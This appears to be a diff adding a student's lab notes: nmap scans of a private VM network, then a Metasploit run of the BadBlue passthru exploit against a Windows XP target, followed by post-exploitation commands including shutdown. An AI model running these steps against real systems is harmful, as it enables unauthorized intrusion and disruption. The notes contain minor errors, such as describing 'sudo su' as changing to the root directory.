@@ -1,0 +1,15 @@
+sudo su (change to root directory)
+nmap -sS -sV 10.0.2.15-254 (host machine IP address range) --> Kali Linux
+nmap -p80 10.0.2.15 -A (Host machine IP address)
+nmap -p80 10.0.2.4 -A -sT (Target machine IP address) --> winxp
+msfconsole
+seacrh badblue
+use exploit/windows/http/badblue_passthru
+set RHOST 10.0.2.4 (Target Machine IP address)
+exploit
+sysinfo (from this line all info will be about target machine)
+ls
+mkdir
+rmdir
+touch sample.txt
+shutdown
